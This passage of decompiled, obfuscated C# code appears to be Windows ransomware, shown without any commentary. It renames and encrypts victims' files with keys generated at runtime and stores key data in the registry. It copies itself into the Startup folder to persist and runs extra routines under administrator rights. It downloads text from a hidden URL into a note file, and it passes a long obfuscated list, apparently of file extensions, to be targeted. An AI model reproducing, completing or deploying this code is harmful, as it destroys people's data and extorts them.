						if (zLetmNvKrIwT == getString_0(107396762) && new FileInfo(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR).Length > Convert.ToInt32(vwHJGZSsQHuV) * 1024 * 1024)
						{
							try
							{
								if (pcXEMNCHXKbhD != getString_0(107404777))
								{
									if (rCIcEDqTdpw)
									{
										pcXEMNCHXKbhD = gpxoAkpemIpRD + pcXEMNCHXKbhD;
									}
									File.Move(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + pcXEMNCHXKbhD);
								}
							}
							catch (Exception ex6)
							{
								if (LbhjvcCDDsZLYlccs)
								{
									try
									{
										File.AppendAllText(KymHhFbNcwDYA, getString_0(107404539) + CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + getString_0(107356150) + ex6.Message + getString_0(107396529));
									}
									catch (Exception)
									{
									}
								}
								WfLfyuLvRnJc++;
								return;
							}
							if (pcXEMNCHXKbhD != getString_0(107404777))
							{
								CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR += pcXEMNCHXKbhD;
							}
							if (wASqMXkPHKG == getString_0(107396762))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in dYfpziNqSOobL)
									{
										if (CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.pvSBMBPwCxnGTc.pcXEMNCHXKbhD) && SNKStIUyCToW == sQMPyEprCtcgxr.getString_0(107396768))
										{
											if (Convert.ToInt32(uQaSKuiUmt) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR).Length)
											{
												try
												{
													SYJrybFSgaPzO.JEuvJEKelGD(sQMPyEprCtcgxr.getString_0(107408045), sQMPyEprCtcgxr.getString_0(107408040), sQMPyEprCtcgxr.getString_0(107408507), CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().EndsWith(item) && SNKStIUyCToW == sQMPyEprCtcgxr.getString_0(107397025))
										{
											try
											{
												SYJrybFSgaPzO.JEuvJEKelGD(sQMPyEprCtcgxr.getString_0(107408045), sQMPyEprCtcgxr.getString_0(107408040), sQMPyEprCtcgxr.getString_0(107408507), CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = PedoVUYBDhwUQjvS.NlfnWjhcyWLLT(32);
							string text2 = getString_0(107408438);
							text2 = (aeWIyHaDtadg ? PedoVUYBDhwUQjvS.wRFGskFNOCi() : getString_0(107408438));
							string s = ooALNlRpqMWnp.oXJvdDupCCWESvWS(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (tmrMvaVtFfCS == getString_0(107397019))
							{
								byte[] array = null;
								byte[] byte_ = NaRnXemgrEhEu.CfIULFaxXTze(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, Convert.ToInt32(vwHJGZSsQHuV) * 1024 * 1024);
								if (!NaRnXemgrEhEu.dyvfLRQwyjnq(NlACJGRWEHCA: (!vGfsNnNMtKaym) ? (aeWIyHaDtadg ? NaRnXemgrEhEu.vWTJMcrwiwmBiRL(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NaRnXemgrEhEu.vWTJMcrwiwmBiRL(byte_, Convert.FromBase64String(ptBQsjxXVIiCd), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (aeWIyHaDtadg ? GpnnmMPrTtDBD.kAaFSjIASsxCjS(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : GpnnmMPrTtDBD.kAaFSjIASsxCjS(byte_, Convert.FromBase64String(ptBQsjxXVIiCd), Convert.FromBase64String(heWrupMPBNsV))), CeNYFaLSDRX: CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, YSvPvJtuif: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + pcXEMNCHXKbhD, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!aeWIyHaDtadg)
							{
								if (!GwvItkvAvmqBoMs.bEpaIEDRMOENWhX(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, vwHJGZSsQHuV, ptBQsjxXVIiCd, null, Convert.FromBase64String(heWrupMPBNsV)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + pcXEMNCHXKbhD, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!GwvItkvAvmqBoMs.bEpaIEDRMOENWhX(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, vwHJGZSsQHuV, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + pcXEMNCHXKbhD, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (rCIcEDqTdpw)
							{
								pcXEMNCHXKbhD = gpxoAkpemIpRD + pcXEMNCHXKbhD;
							}
							string text3 = PedoVUYBDhwUQjvS.NlfnWjhcyWLLT(32);
							string text4 = getString_0(107408438);
							text4 = (aeWIyHaDtadg ? PedoVUYBDhwUQjvS.wRFGskFNOCi() : getString_0(107408438));
							string s2 = ooALNlRpqMWnp.oXJvdDupCCWESvWS(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (pcXEMNCHXKbhD != getString_0(107404777))
							{
								if (!YEiCwolccbrDJ)
								{
									if (!aeWIyHaDtadg)
									{
										FUeBmieOxgVOz(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + pcXEMNCHXKbhD, VROLwKjAIsul);
									}
									else
									{
										FUeBmieOxgVOz(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + pcXEMNCHXKbhD, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!aeWIyHaDtadg)
										{
											UhqvkICiuPON(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + pcXEMNCHXKbhD, VROLwKjAIsul, Convert.FromBase64String(heWrupMPBNsV));
										}
										else
										{
											UhqvkICiuPON(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + pcXEMNCHXKbhD, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (LbhjvcCDDsZLYlccs)
										{
											try
											{
												File.AppendAllText(KymHhFbNcwDYA, getString_0(107404539) + CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + getString_0(107404795) + ex11.Message + getString_0(107396529));
											}
											catch (Exception)
											{
											}
										}
										WfLfyuLvRnJc++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + pcXEMNCHXKbhD, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!YEiCwolccbrDJ)
							{
								if (!aeWIyHaDtadg)
								{
									FUeBmieOxgVOz(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + getString_0(107404804), VROLwKjAIsul);
								}
								else
								{
									FUeBmieOxgVOz(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + getString_0(107404804), Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!aeWIyHaDtadg)
									{
										UhqvkICiuPON(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, VROLwKjAIsul, Convert.FromBase64String(heWrupMPBNsV));
									}
									else
									{
										UhqvkICiuPON(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (LbhjvcCDDsZLYlccs)
									{
										try
										{
											File.AppendAllText(KymHhFbNcwDYA, getString_0(107404539) + CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + getString_0(107404795) + ex14.Message + getString_0(107396529));
										}
										catch (Exception)
										{
										}
									}
									WfLfyuLvRnJc++;
									return;
								}
							}
							if (aeWIyHaDtadg)
							{
								if (pcXEMNCHXKbhD != getString_0(107404777))
								{
									fowJyXOiDyhEY(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + pcXEMNCHXKbhD, bytes2);
								}
								else
								{
									fowJyXOiDyhEY(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, bytes2);
								}
							}
						}
						end_IL_085c_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1069;
			IL_1069:
			dicUQzGeuGgAYU.Remove(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
		}

		static xTicVszXpILTir()
		{
			Strings.CreateGetStringDelegate(typeof(xTicVszXpILTir));
		}
	}

	private sealed class OMCAJwLkqgm
	{
		public string CPizXigAwuri;

		public string fdrqxYITdZZrNp;

		public void _003CEncrypt2_003Eb__45()
		{
			while (true)
			{
				try
				{
					File.Delete(CPizXigAwuri);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__46()
		{
			while (true)
			{
				try
				{
					if (File.Exists(fdrqxYITdZZrNp))
					{
						File.Delete(fdrqxYITdZZrNp);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string uIpYqEvOzPpeD;

	public static byte[] VROLwKjAIsul;

	public static string gXRstoeNfSB;

	public static string usPuVjNWIMFCfzm;

	public static List<string> OtDxRoGRan;

	public static List<string> BLtrzNvLyhbRP;

	public static string PpqwSTMWExti;

	public static string ptBQsjxXVIiCd;

	public static string heWrupMPBNsV;

	public static string QGCgJoxiimxbWS;

	public static string sLvQNFJZYcJ;

	public static int voukbtchDrELmBv;

	public static string ernpBfXEaTaC;

	public static string EzzQRnXAfEvKuUU;

	public static string sAOKsiPynyOX;

	public static string FcGWFmXDQEI;

	public static string qiQUNkzMrMKyK;

	public static string olBToSwzFuMLOs;

	public static string kyFJvhqKYGyqMI;

	public static string kzweLPCpTA;

	public static List<string> ebgRoJStsqSA;

	public static List<string> aJxBDYqKswV;

	public static string tzPvqPVQPnHM;

	public static string pmOBJNRVMRPDV;

	public static string ncCDVfueqFYPXXg;

	public static List<string> usKuKFlfRGo;

	public static string xQSfdowgAngWtM;

	private static string QYtWJTPITWv;

	public static string ABcQQsWptXmkku;

	public static string bQNSgihIGUjEp;

	public static List<string> XarSXhOJUTJuFt;

	public static List<string> mdyFThwFRBOHoa;

	public static List<string> GCrSVISOUVr;

	public static List<string> ikpbUcWXzcxbZ;

	public static string WfYMtHvcWdVLkR;

	public static List<string> uSjNOsTsmigYN;

	public static List<string> jWqVjnRIQYCqOpat;

	public static string yPLSLnZWrYePA;

	public static string IFMoJSHODHZV;

	internal static DateTime mXBbIhzOyOcmKiQM;

	internal static DateTime HIfNyJNrtBHP;

	public static string zLetmNvKrIwT;

	public static string vwHJGZSsQHuV;

	public static string DwncJqPrYNRfVzNG;

	public static string TQJljvOHNMi;

	public static string DIiJKiYlzQvs;

	public static string TMHFAakJSsS;

	public static string UUIBzfTyBWH;

	public static string wASqMXkPHKG;

	public static List<string> dYfpziNqSOobL;

	public static string SNKStIUyCToW;

	public static string uQaSKuiUmt;

	public static string wrEfuUZiVhFkuXnL;

	public static string ZkldbQEYeeof;

	public static string rArtKYGsnrmQ;

	public static string vHKKlZoghg;

	public static string fKAaYgJjENYgW;

	public static string GpdHiVWCHuSiS;

	public static string rAaEXIinkLiOSN;

	public static string fuejbDskEjJiZ;

	public static string pGvUNugSZbPk;

	public static string IMhezdBIzUX;

	public static string tfcPZzlafuwsHk;

	public static string SWXQQJgeWBPli;

	public static string ABJXZpDIvau;

	public static string gzgzbgPejsDK;

	public static string wVVmqrdGeUXsjzM;

	public static string AIFkEfLEFATFr;

	public static string uCWDfzwsOhcHb;

	public static string kcoCbafUQcNu;

	public static string GifiWLQUQbX;

	public static string GgwClyzLkQAv;

	public static string HbPrFXeRvEJlR;

	public static string zEwtyzOIcaVu;

	public static string XkpwdvjSZi;

	public static string ZpVlnoGPPOyk;

	public static string tmrMvaVtFfCS;

	public static string pnSrpYQNtuTOP;

	public static string rWztVQEavHzyaEvX;

	public static string[] JwhxWOIlqyyGA;

	public static string VvUkitdKffw;

	public static bool vGfsNnNMtKaym;

	public static string WvSpclaNoCFc;

	public static bool aeWIyHaDtadg;

	public static bool BROMmDQCrdRq;

	public static bool PawSPHTvgd;

	public static bool RgoefyjRKB;

	public static string KymHhFbNcwDYA;

	public static bool LbhjvcCDDsZLYlccs;

	public static bool hMazFovbkxfwzD;

	public static bool DnjuZDrvJTK;

	public static bool JOJyxHQlEtnt;

	public static bool YEiCwolccbrDJ;

	public static string DNnNiXPlebeA;

	public static bool IebLDrmorstxvf;

	public static Stopwatch TXLREvoAvQKxW;

	public static int WfLfyuLvRnJc;

	public static int FqOxBTVEHuVPbA;

	public static bool rCIcEDqTdpw;

	public static string gpxoAkpemIpRD;

	public static string[] aWfGWqITxwp;

	public static List<string> AxXilrIaJeJyLk;

	public static int SlKkhSsDvLYM;

	public static bool EPXRMTVzpWiKxI;

	public static bool IAkYnTxqXujAJB;

	public static List<string> MIMunWsuizdBMds;

	public static List<string> klVyZfXSAWHR;

	public static List<string> WtuOHEsqkVt;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegated;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			mCHVUABGkRt CS_0024_003C_003E8__locals0 = new mCHVUABGkRt();
			CS_0024_003C_003E8__locals0.dlDWlLyApVaoI = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.dlDWlLyApVaoI) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			XYbqKBlwJZo.MXyPJmOquqoe(QYtWJTPITWv);
		}
		catch (Exception)
		{
		}
		try
		{
			if (ZpVlnoGPPOyk == getString_0(107396742))
			{
				Thread thread = new Thread(CpvMWVTAwL.JAamELhazjaqaX);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (sAOKsiPynyOX == getString_0(107396742))
		{
			Thread.Sleep(int.Parse(FcGWFmXDQEI));
		}
		if (rArtKYGsnrmQ == getString_0(107396742))
		{
			Thread thread2 = new Thread(oawtWZlRLJH.SnPGvXQHWhVWJO);
			thread2.IsBackground = true;
			thread2.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && UUIBzfTyBWH == getString_0(107396742))
		{
			try
			{
				drBNsNInWsZxiDt(UwCpksGCJZfb(getString_0(107397217)));
			}
			catch
			{
			}
		}
		try
		{
			if (kyFJvhqKYGyqMI == getString_0(107396742) && pswwGrrtTuOy.LZqlZBjxsCvZj())
			{
				new OFlKPtqUUnHM().cjelyGXedcD(bool_0: false);
				pswwGrrtTuOy.SWdGszsOMSyM();
			}
		}
		catch (Exception)
		{
		}
		if (pmOBJNRVMRPDV == getString_0(107396742) && pswwGrrtTuOy.LZqlZBjxsCvZj())
		{
			new OFlKPtqUUnHM().cjelyGXedcD(bool_0: false);
			new OFlKPtqUUnHM().AzrxnpouKyAG();
		}
		if (EzzQRnXAfEvKuUU == getString_0(107396742))
		{
			eysztliuivIFM.nbFGDYfoPWm();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397112);
			string text2 = text + Path.GetFileName(fileName);
			if (sLvQNFJZYcJ == getString_0(107396742) && fileName != text2)
			{
				Thread thread3 = new Thread(TcCpmTjIUhoTdaWUI);
				thread3.IsBackground = true;
				thread3.Priority = ThreadPriority.Normal;
				thread3.Start();
			}
			if (PpqwSTMWExti == getString_0(107396742) && mainModule != null && fileName != text2)
			{
				try
				{
					voukbtchDrELmBv = xJxBRgJwtfLMmm(0, ebgRoJStsqSA.Count);
					File.Copy(fileName, text + ebgRoJStsqSA[voukbtchDrELmBv], overwrite: true);
					Process.Start(text + ebgRoJStsqSA[voukbtchDrELmBv]);
					rekpnonBnDwKB();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (yPLSLnZWrYePA == getString_0(107396742) && DateTime.Now < mXBbIhzOyOcmKiQM)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (IFMoJSHODHZV == getString_0(107396742) && DateTime.Now > HIfNyJNrtBHP)
			{
				rekpnonBnDwKB();
			}
		}
		catch
		{
		}
		nSIwblfbixJB();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegated == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegated = delegate
			{
				List<string> source = mdyFThwFRBOHoa;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107404722)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				List<string> gCrSVISOUVr = GCrSVISOUVr;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107404709)), string_0);
					};
				}
				Parallel.ForEach(gCrSVISOUVr, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				if (rWztVQEavHzyaEvX == getString_0(107396742))
				{
					string[] jwhxWOIlqyyGA = JwhxWOIlqyyGA;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
						{
							eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107404709)), getString_0(107404684) + string_0 + getString_0(107404131));
						};
					}
					Parallel.ForEach(jwhxWOIlqyyGA, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				}
				if (!GzujaRTNkzjcu().Contains(getString_0(107404865)))
				{
					QcdyUTbkpEHyhuof(WfYMtHvcWdVLkR);
				}
				else
				{
					List<string> source2 = ikpbUcWXzcxbZ;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
						{
							eZjDlpokwsIwI(UwCpksGCJZfb(krZwaVuuJwBahD(getString_0(107404126))), string_0);
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				}
				List<string> source3 = uSjNOsTsmigYN;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
					{
						eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107404133)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
			};
		}
		Thread thread4 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegated);
		thread4.Priority = ThreadPriority.Normal;
		thread4.IsBackground = true;
		thread4.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397139))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397139)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107397090)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !OtDxRoGRan.Contains(text6) && text6 != getString_0(107397101) && text6 != getString_0(107397048) && text6 != getString_0(107397027))
								{
									OtDxRoGRan.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397030)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107396985))
						{
							tfcPZzlafuwsHk = getString_0(107396742);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397008))
						{
							tfcPZzlafuwsHk = getString_0(107396999);
						}
					}
					if (text3.Contains(getString_0(107396450)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107396985))
						{
							IebLDrmorstxvf = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397008))
						{
							IebLDrmorstxvf = false;
						}
					}
					if (text3.Contains(getString_0(107396465)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107396985))
						{
							LbhjvcCDDsZLYlccs = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397008))
						{
							LbhjvcCDDsZLYlccs = false;
						}
					}
					if (text3.Contains(getString_0(107396452)))
					{
						string text10 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107396985))
						{
							EPXRMTVzpWiKxI = true;
						}
						else if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397008))
						{
							EPXRMTVzpWiKxI = false;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (LbhjvcCDDsZLYlccs)
			{
				try
				{
					File.AppendAllText(KymHhFbNcwDYA, getString_0(107396423) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (tfcPZzlafuwsHk == getString_0(107396999))
		{
			JeaXEVaVnVlURf();
		}
		if (IAkYnTxqXujAJB)
		{
			try
			{
				Console.WriteLine(getString_0(107396346));
				owXMAOWwDMD.gBKWUkZaKet();
			}
			catch (Exception ex8)
			{
				if (LbhjvcCDDsZLYlccs)
				{
					try
					{
						File.AppendAllText(KymHhFbNcwDYA, getString_0(107396325) + ex8.Message);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (tfcPZzlafuwsHk == getString_0(107396742))
		{
			try
			{
				obggDVdAhf();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && PawSPHTvgd)
			{
				try
				{
					Thread thread5 = new Thread(RmnijQkhIZRX.ntDUiMqCnKMgdH);
					thread5.IsBackground = true;
					thread5.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			eZjDlpokwsIwI(getString_0(107396248), UwCpksGCJZfb(getString_0(107396267)));
		}
		if (tzPvqPVQPnHM == getString_0(107396742) && rHABtcOkWFsPkpgF() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread6 = new Thread(cyikEDwiTbqA.vHHSOIMBjuyLzz);
			thread6.IsBackground = true;
			thread6.Priority = ThreadPriority.Normal;
			thread6.Start();
		}
		_ = bQNSgihIGUjEp == getString_0(107396742);
		SecureString secureString = new SecureString();
		if (DwncJqPrYNRfVzNG == getString_0(107396999))
		{
			ptBQsjxXVIiCd = PedoVUYBDhwUQjvS.NlfnWjhcyWLLT(32);
			heWrupMPBNsV = PedoVUYBDhwUQjvS.wRFGskFNOCi();
		}
		else
		{
			ptBQsjxXVIiCd = getString_0(107396674);
		}
		QGCgJoxiimxbWS = ooALNlRpqMWnp.oXJvdDupCCWESvWS(ptBQsjxXVIiCd + heWrupMPBNsV);
		if (!aeWIyHaDtadg)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(UwCpksGCJZfb(getString_0(107396629)));
				if (registryKey != null)
				{
					registryKey.SetValue(UwCpksGCJZfb(getString_0(107396616)) + (registryKey.ValueCount + 1), QGCgJoxiimxbWS);
					registryKey.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		else
		{
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(UwCpksGCJZfb(getString_0(107396629)));
				if (registryKey2 != null && registryKey2.ValueCount == 0)
				{
					registryKey2.SetValue(UwCpksGCJZfb(getString_0(107396616)) + (registryKey2.ValueCount + 1), QGCgJoxiimxbWS);
					registryKey2.Close();
				}
				else if (registryKey2 != null && registryKey2.ValueCount != 0)
				{
					registryKey2.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		if (GpdHiVWCHuSiS == getString_0(107396742))
		{
			JiwsVJMEwtLHxu();
		}
		if (DnjuZDrvJTK)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), DNnNiXPlebeA)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), DNnNiXPlebeA), string.Concat(UwCpksGCJZfb(getString_0(107396575)), new WebClient().DownloadString(UwCpksGCJZfb(getString_0(107396582))), getString_0(107396509), UwCpksGCJZfb(getString_0(107396504)), DateTime.Now, getString_0(107396509), UwCpksGCJZfb(getString_0(107396495)), QGCgJoxiimxbWS));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), DNnNiXPlebeA), getString_0(107395894) + QGCgJoxiimxbWS);
				}
			}
			catch (Exception ex13)
			{
				if (LbhjvcCDDsZLYlccs)
				{
					try
					{
						File.AppendAllText(KymHhFbNcwDYA, getString_0(107395865) + ex13.Message + getString_0(107396509));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		UyjygnUfHQfS.XLrFfRDDRRcN(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), kcoCbafUQcNu), OIyqrMvBlER(QGCgJoxiimxbWS), null, null, getString_0(107395848), getString_0(107395799), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			POrHHaqaAd();
		}
		try
		{
			try
			{
				if (IebLDrmorstxvf)
				{
					Console.WriteLine(getString_0(107395814));
				}
			}
			catch
			{
			}
			pciWuEzAvjS(new string[1] { getString_0(107395733) }, new string[2757]
			{
				getString_0(107395756),
				getString_0(107395751),
				getString_0(107395714),
				getString_0(107395705),
				getString_0(107395700),
				getString_0(107395727),
				getString_0(107395722),
				getString_0(107395717),
				getString_0(107396192),
				getString_0(107396187),
				getString_0(107396182),
				getString_0(107396209),
				getString_0(107396200),
				getString_0(107396163),
				getString_0(107396154),
				getString_0(107396149),
				getString_0(107396176),
				getString_0(107396171),
				getString_0(107396166),
				getString_0(107396129),
				getString_0(107396120),
				getString_0(107396147),
				getString_0(107396142),
				getString_0(107396137),
				getString_0(107396132),
				getString_0(107396095),
				getString_0(107396090),
				getString_0(107396085),
				getString_0(107396112),
				getString_0(107396107),
				getString_0(107396102),
				getString_0(107396065),
				getString_0(107396060),
				getString_0(107396055),
				getString_0(107396078),
				getString_0(107396073),
				getString_0(107396068),
				getString_0(107396031),
				getString_0(107395722),
				getString_0(107396026),
				getString_0(107396192),
				getString_0(107396049),
				getString_0(107396044),
				getString_0(107396039),
				getString_0(107396002),
				getString_0(107395997),
				getString_0(107395992),
				getString_0(107396019),
				getString_0(107396014),
				getString_0(107396009),
				getString_0(107396004),
				getString_0(107395967),
				getString_0(107395962),
				getString_0(107395957),
				getString_0(107395984),
				getString_0(107395979),
				getString_0(107395974),
				getString_0(107395425),
				getString_0(107395416),
				getString_0(107395443),
				getString_0(107395434),
				getString_0(107395389),
				getString_0(107396026),
				getString_0(107395408),
				getString_0(107395399),
				getString_0(107395358),
				getString_0(107395349),
				getString_0(107395372),
				getString_0(107395331),
				getString_0(107395326),
				getString_0(107395317),
				getString_0(107395340),
				getString_0(107395299),
				getString_0(107395294),
				getString_0(107395289),
				getString_0(107395284),
				getString_0(107395311),
				getString_0(107395306),
				getString_0(107395301),
				getString_0(107395260),
				getString_0(107395255),
				getString_0(107395282),
				getString_0(107395277),
				getString_0(107395272),
				getString_0(107395235),
